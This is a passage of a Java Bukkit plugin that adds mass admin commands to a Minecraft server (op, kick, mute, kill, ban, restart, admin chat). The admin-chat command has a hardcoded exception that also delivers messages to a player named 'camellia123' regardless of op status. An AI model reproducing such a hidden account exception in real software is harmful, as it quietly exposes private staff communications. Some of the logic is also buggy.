package io.github.Dinner1111.ServerUtils;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.*;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class ServerUtilsCommands implements CommandExecutor {
    boolean muted = false;
    boolean canTalk = true;
    boolean isBroadcasting = false;
    Player firstSender;
    boolean privateWorld = false;
    int task;
    int i;
    String announcement = "";
    MuteListener listen = new MuteListener();
    Plugin plg;
    
    public ServerUtilsCommands(Plugin pl) {
        plg = pl;
    }
    public boolean onCommand(CommandSender sender, Command cmd, String cmdLine, String[] args) {
        if (cmd.getName().equalsIgnoreCase("util-op")) {
            if (sender.hasPermission("Utils.Util.Op")) {
                if (args.length == 0) {
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.isOp()) {
                            p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has opped any online players.");
                        } else {
                            if (!p.isOp()) {
                                p.setOp(true);
                                p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has opped you.");
                            }
                        }
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-op");
                    return true;
                } 
            }
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-deop")) {
            if (sender.hasPermission("Utils.Util.Deop")) {
                if (args.length == 0) {
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.isOp() && p != (Player) sender) {
                            p.setOp(false);
                            p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "]" + ChatColor.GRAY + " You are no longer opped.");
                        }
                    }
                    sender.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "]" + ChatColor.AQUA + " You " + ChatColor.GRAY + "deopped all opped online players.");
                } else {
                    sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-deop");
                    return true;
                }
            }
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-unwhitelist")) {
            if (sender.hasPermission("Utils.Util.Unwhitelist")) {
                if (args.length == 0) {
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.isOp()) {
                            p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "]" + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has unwhitelisted all online players.");
                        } else {
                            if (p.isWhitelisted() && !p.isOp()) {
                                p.setWhitelisted(false);
                            }
                        }
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-unwhitelist");
                    return true;
                }
            }
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-kick")) {
            if (sender.hasPermission("Utils.Util.Kick")) {
                if (args.length == 0 || args.length == 1) {
                    boolean unwhitelist = false;
                    if (args.length == 1) {
                        if (args[0].equalsIgnoreCase("-u")) {
                            unwhitelist = true;
                        } else {
                            sender.sendMessage(ChatColor.RED + "Unknown flag.\nUsage: /util-kick [-u]");
                        }
                    } else {
                        for (Player p : Bukkit.getOnlinePlayers()) {
                            if (unwhitelist == false) {
                                if (p.isOp()) {
                                    p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has kicked all online players.");
                                }
                            } else {
                                if (p.isOp()) {
                                    p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has kicked and unwhitelisted all online players.");
                                }
                                if (!p.isOp() && p != (Player) sender) {
                                    p.kickPlayer(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "]" + ChatColor.GRAY + "You were kicked by " + ChatColor.AQUA + sender.getName());                       
                                    if (unwhitelist == true) {
                                        p.setWhitelisted(false);
                                    }
                                } 
                            }
                        }
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-kick [-u]");
                    return true;
                }
            }
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-help") || cmd.getName().equalsIgnoreCase("util")) {
            if (sender.hasPermission("Utils.Util.Help")) {
                if (args.length == 0) {
                    sender.sendMessage(ChatColor.DARK_GRAY + "=============" + ChatColor.AQUA + " Utility Help " + ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "Page " + ChatColor.GOLD + "1" + ChatColor.DARK_GRAY + "/" + ChatColor.GOLD + "1" + ChatColor.DARK_GRAY + "] "+ ChatColor.DARK_GRAY + "==============="
                            + ChatColor.AQUA + "\nUtilities " + ChatColor.DARK_GRAY + "-" + ChatColor.GRAY + " Type " + ChatColor.AQUA + "/util-list" + ChatColor.GRAY + " for a list of usable utilities."
                            + ChatColor.AQUA + "\nFlags " + ChatColor.DARK_GRAY + "-" + ChatColor.GRAY + " If you are unfamiliar with flags: Flags are used to invert, change, or add to the effect of a command."
                            + ChatColor.AQUA + "\nWorld Generation " + ChatColor.DARK_GRAY + "-" + ChatColor.GRAY + " Any world generated by " + ChatColor.BLUE + "ServerUtils" + ChatColor.GRAY + " will be a blank void world.");
                } else {
                    sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-help");
                    return false;
                }
            }   
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-world")) {
            if (sender.hasPermission("Utils.Util.World")) {
                if (args.length == 1) {
                    if (args[0] != null && !args[0].equalsIgnoreCase("-p")) {
                        String worldName = args[0];
                        boolean n = worldName.contains(".");
                        if (n == true) {
                            sender.sendMessage(ChatColor.RED + "You may not have '" + ChatColor.GOLD + "." + ChatColor.RED + "' in your world name.\nUsage: /util-world [world name]");
                            return true;
                        }
                        for (Player p : Bukkit.getOnlinePlayers()) {
                            if (p.isOp() == true) {
                                p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " is creating world " + ChatColor.BOLD + worldName.toLowerCase() + ChatColor.RESET + "" + ChatColor.GRAY + ".");
                            }
                        }
                        Bukkit.getServer().dispatchCommand(sender, "mv create " + args[0] + " normal -t flat -g NullTerrain");
                    } else {
                        sender.sendMessage(ChatColor.RED + "You must have a world name!\nUsage: /util-world [world name]");
                        return true;
                    }
                } else if (args.length != 1){
                    if (args.length > 1) {
                        sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-world [world name]");
                    } else {
                        sender.sendMessage(ChatColor.RED + "Too few arguments.\nUsage: /util-world [world name]");
                    }
                    return true;
                }
            }
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-list")) {
            if (sender.hasPermission("Utils.Util.List")) {
                if (args.length == 0) {
                    sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility List " + ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "Page " + ChatColor.GOLD + "1" + ChatColor.DARK_GRAY + "/" + ChatColor.GOLD + "3" + ChatColor.DARK_GRAY + "] "+ ChatColor.DARK_GRAY + "==============="
                        + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Help" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list help"
                        + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Op" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list op"
                        + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Deop" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list deop"
                        + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Unwhitelist" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list unwhitelist"
                        + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Kick" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list kick");
                } else if (args.length == 1) {
                    if (args[0].equalsIgnoreCase("2")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility List " + ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "Page " + ChatColor.GOLD + "2" + ChatColor.DARK_GRAY + "/" + ChatColor.GOLD + "3" + ChatColor.DARK_GRAY + "] "+ ChatColor.DARK_GRAY + "==============="
                            + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "World" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list world"
                            + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Mute" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list mute"
                            + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Broadcast" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list broadcast"
                            + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Kill" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list kill"
                            + ChatColor.AQUA + "\nUtil" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Restart" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list restart");
                    } else if (args[0].equalsIgnoreCase("3")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Misc Utility List " + ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "Page " + ChatColor.GOLD + "2" + ChatColor.DARK_GRAY + "/" + ChatColor.GOLD + "3" + ChatColor.DARK_GRAY + "] "+ ChatColor.DARK_GRAY + "==============="
                            + ChatColor.AQUA + "\nUtility" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "AdminChat" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list adminchat"
                            + ChatColor.AQUA + "\nUtility" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Silent" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list silent"
                            + ChatColor.AQUA + "\nUtility" + ChatColor.DARK_GRAY + "-" + ChatColor.GREEN + "Announcer" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-list announcer");
                    } else if (args[0].equalsIgnoreCase("help")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Help" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Displays useful tips and reminders." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-help" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.Help");
                    } else if (args[0].equalsIgnoreCase("op")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Op" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Grants op permissions to all online players that are not an op." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-op" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.Op");
                    } else if (args[0].equalsIgnoreCase("deop")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Deop" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Deops all non op players, except for the command sender." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-deop" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.Deop");
                    } else if (args[0].equalsIgnoreCase("unwhitelist")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Unwhitelist" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Unwhitelists all non op players that are online." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-unwhitelist" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.Unwhitelist");
                    } else if (args[0].equalsIgnoreCase("kick")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Kick" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Kicks all non op players." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-kick [-u]" + ChatColor.AQUA + "\nFlags" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "-u" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Unwhitelists and kicks players." + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.Kick");
                    } else if (args[0].equalsIgnoreCase("world")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "World" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Generates a new void world with the name inputed." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-world [world name]" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.World");
                    } else if (args[0].equalsIgnoreCase("mute")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Mute" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Mutes all non op players." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-mute : Type again to unmute." + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.Mute");
                    } else if (args[0].equalsIgnoreCase("broadcast")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Broadcast" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Server-wide broadcast. Mutes all non op players." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-broadcast : Type again to exit the mode." + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.Broadcast");
                    } else if (args[0].equalsIgnoreCase("kill")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Kill" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Kills all non op players." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-kill" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.Kill");
                    } else if (args[0].equalsIgnoreCase("restart")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Restart" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Stops the server in the given amount of seconds." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/util-restart [seconds]" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Util.Restart");
                    } else if (args[0].equalsIgnoreCase("adminchat")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "AdminChat" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Allows you to speak in a private admin chat." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/a [message]" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.AdminChat");
                    } else if (args[0].equalsIgnoreCase("silent")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Silent" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Silently executes a specified command." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/silent [op|deop|unwhitelist|whitelist|kick|ban]" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Silent");
                    } else if (args[0].equalsIgnoreCase("announcer")) {
                        sender.sendMessage(ChatColor.DARK_GRAY + "===============" + ChatColor.AQUA + " Utility" + ChatColor.DARK_GRAY + " - " + ChatColor.AQUA + "Kill" + ChatColor.DARK_GRAY + " ===============" + ChatColor.AQUA + "\nDescription" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Schedules an announcement to broadcast every specified minutes." + ChatColor.AQUA + "\nUsage" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "/announcer [minute delay] [message]" + ChatColor.AQUA + "\nPermission" + ChatColor.DARK_GRAY + " - " + ChatColor.GRAY + "Utils.Announcer");
                    } else {
                        sender.sendMessage(ChatColor.RED + "Invalid help subject.\nUsage /util-list [subject]");
                        if (args.length <= 2) {
                            sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage /util-list [subject]");
                        }
                        return true;
                    }
                } else {
                    sender.sendMessage(ChatColor.DARK_RED + "Too many arguments!\nUsage: /util-list [subject]");
                    return true;
                }
            }
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-mute")) {
            if (sender.hasPermission("Utils.Util.Mute")) {
                if (args.length == 0) {
                    if (!muted) {
                        for (Player p : Bukkit.getOnlinePlayers()) {
                            if (p.isOp()) {
                                p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has muted all online players.");
                            } else {
                                p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has muted you.");
                            }
                        }
                        muted = !muted;
                        listen.setCanTalk(false);
                    } else {
                        muted = !muted;
                        listen.setCanTalk(true);
                        for (Player p : Bukkit.getOnlinePlayers()) {
                            if (p.isOp()) {
                                p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "]" + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has unmuted all online players.");
                            } else {
                                p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "]" + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has unmuted you.");
                            }
                        }
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-mute");
                    return true;
                }
            }
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-broadcast")) {
            if (sender.hasPermission("Utils.Util.Broadcast")) {
                if (args.length == 0) {
                    if (!isBroadcasting) {
                        Bukkit.getServer().broadcastMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " is now broadcasting!");
                        listen.setIsBroadcasting(true);
                        isBroadcasting = !isBroadcasting;
                        firstSender = (Player) sender;
                    } else {
                        if ((Player) sender == firstSender) {
                            Bukkit.getServer().broadcastMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " is no longer broadcasting.");
                            isBroadcasting = !isBroadcasting;
                            listen.setIsBroadcasting(false);
                        } else {
                            sender.sendMessage(ChatColor.RED + "You did not start the broadcast!");
                        }
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-broadcast");
                    return true;
                }
            }
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-kill")) {
            if (sender.hasPermission("Utils.Util.Kill")) {
                if (args.length == 0) {
                    for (Player target : Bukkit.getOnlinePlayers()) {
                        if (target == (Player) sender || target.isOp()) {
                            target.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has slain all online players.");
                        } else {
                            target.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has slain you.");
                            target.setHealth(0);
                        }
                    }
                    return true;
                } else {
                    sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-kill");
                    return true;
                }
            }
            return true;
        }
        if (cmd.getName().equalsIgnoreCase("util-restart")) {
            if (sender.hasPermission("Utils.Util.Restart")) {
                final int newI = i;
                final Player newSender = (Player) sender;
                if (args.length == 1) {
                    try { i = Integer.parseInt(args[0]); }
                    catch (Exception e) {
                        sender.sendMessage(ChatColor.RED + "You must enter a valid number.");
                        return true;
                    }
                    i = i * 20;
                    task = Bukkit.getServer().getScheduler()
                            .scheduleSyncRepeatingTask(plg, new Runnable() {
                                public void run() {
                                    i = i - 20;
                                    if (i == 0) {
                                        Bukkit.getLogger().info("Server shutdown via /util-shutdown by " + newSender.getName() + " with a delay of " + (newI / 20) + " seconds.");
                                        Bukkit.shutdown();
                                    }
                                    Bukkit.getServer().broadcastMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.GRAY + "The server is restarting in " + ChatColor.AQUA + i + ChatColor.GRAY + " seconds.");
                                }
                            }, 0, 100);
                } else if (args.length == 0) {
                    Bukkit.getLogger().info("Server shutdown via /util-shutdown by " + newSender.getName() + " with no delay.");
                    Bukkit.shutdown();
                } else {
                    sender.sendMessage(ChatColor.RED + "Too many arguments.\nUsage: /util-restart [time]");
                    return true;
                }
            }
        }
        if (cmd.getName().equalsIgnoreCase("a")) {
            if (sender.hasPermission("Utils.AdminChat")) {
                if (args.length >= 1) {
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.isOp() || p.getName().equalsIgnoreCase("camellia123")) {
                            String m = "";
                            for (String s : args) {
                                m += s + " ";
                            }
                            m = m.substring(0, m.length() - 1);
                            Player s = (Player) sender;
                            p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "A" + ChatColor.DARK_GRAY + "] " + ChatColor.DARK_GRAY + "<" + ChatColor.RESET + s.getDisplayName() + ChatColor.DARK_GRAY + "> " + ChatColor.GRAY + m);
                        }
                    }
                } else {
                    sender.sendMessage(ChatColor.RED + "Usage: /a [message]");
                    return true;
                }
            }
        }
        if (cmd.getName().equalsIgnoreCase("silent")) {
            if (sender.hasPermission("Utils.Silent")) {
                if (args.length == 2) {
                    Player target = Bukkit.getPlayer(args[1]);
                    if (target != null) {
                        if (args[0].equalsIgnoreCase("op")) {
                            for (Player p : Bukkit.getOnlinePlayers()) {
                                if (p.isOp()) {
                                    p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " silently opped " + ChatColor.AQUA + target.getName() + ChatColor.GRAY + ".");
                                }
                            }
                            target.setOp(true);
                            return true;
                        }
                        if (args[0].equalsIgnoreCase("deop")) {
                            target.setOp(false);
                            for (Player p : Bukkit.getOnlinePlayers()) {
                                if (p.isOp()) {
                                    p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " silently deopped " + ChatColor.AQUA + target.getName() + ChatColor.GRAY + ".");
                                }
                            }
                            return true;
                        }
                        if (args[0].equalsIgnoreCase("unwhitelist")) {
                            target.setWhitelisted(false);
                            for (Player p : Bukkit.getOnlinePlayers()) {
                                if (p.isOp()) {
                                    p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " silently unwhitelisted " + ChatColor.AQUA + target.getName() + ChatColor.GRAY + ".");
                                }
                            }
                            return true;
                        }
                        if (args[0].equalsIgnoreCase("whitelist")) {
                            target.setWhitelisted(true);
                            for (Player p : Bukkit.getOnlinePlayers()) {
                                if (p.isOp()) {
                                    p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " silently whitelisted " + ChatColor.AQUA + target.getName() + ChatColor.GRAY + ".");
                                }
                            }
                            return true;
                        }
                        if (args[0].equalsIgnoreCase("kick")) {
                            target.kickPlayer(ChatColor.GRAY + "You have been kicked.");
                            for (Player p : Bukkit.getOnlinePlayers()) {
                                if (p.isOp()) {
                                    p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " silently kicked " + ChatColor.AQUA + target.getName() + ChatColor.GRAY + ".");
                                }
                            }
                            return true;
                        }
                        if (args[0].equalsIgnoreCase("ban")) {
                            target.setWhitelisted(false);
                            target.setOp(false);
                            target.setBanned(true);
                            target.kickPlayer(ChatColor.GRAY + "You have been banned.");
                            for (Player p : Bukkit.getOnlinePlayers()) {
                                if (p.isOp()) {
                                    p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " silently unwhitelisted " + ChatColor.AQUA + target.getName() + ChatColor.GRAY + ".");
                                }
                            }
                            return true;
                        }
                    }
                }
                sender.sendMessage(ChatColor.RED + "Usage: /silent [op|deop|unwhitelist|whitelist|kick|ban] [player]");
            }
        }
        if (cmd.getName().equalsIgnoreCase("announcer")) {
            if (sender.hasPermission("Utils.Announcer")) {
                long delay = 0;
                if (args.length >= 2) {
                    int n = 0;
                    boolean replace = false;
                    try { 
                        n = Integer.parseInt(args[0]);
                        n = (n * 60) * 20;
                        delay = n;
                    } catch (Exception e) {
                        replace = true;
                        delay = 6000;
                    }
                    if (delay <= 1199) {
                        sender.sendMessage(ChatColor.RED + "The delay must be at least 1 minute.");
                        return true;
                    }
                    announcement = "";
                    if (replace == false) {
                        for (int w = 1; w < args.length; w++) {
                            announcement += args[w] + " ";
                        }
                    } else {
                        for (int w = 0; w < args.length; w++) {
                            announcement += args[w] + " ";
                        }
                    }
                    announcement = announcement.substring(0, announcement.length() - 1);
                    if (announcement.contains("`")) {
                        announcement.replace('`', '§');
                    }
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.isOp()) {
                            p.sendMessage(ChatColor.DARK_GRAY + "[" + ChatColor.BLUE + "ServerUtils" + ChatColor.DARK_GRAY + "] " + ChatColor.AQUA + sender.getName() + ChatColor.GRAY + " has changed the announcement to " + ChatColor.DARK_GRAY + "\"" + ChatColor.RESET + announcement + ChatColor.DARK_GRAY + "\"" + ChatColor.GRAY + " and it will display every " + ChatColor.AQUA + ((delay / 20) / 60) + ChatColor.GRAY + " minutes.");
                        }
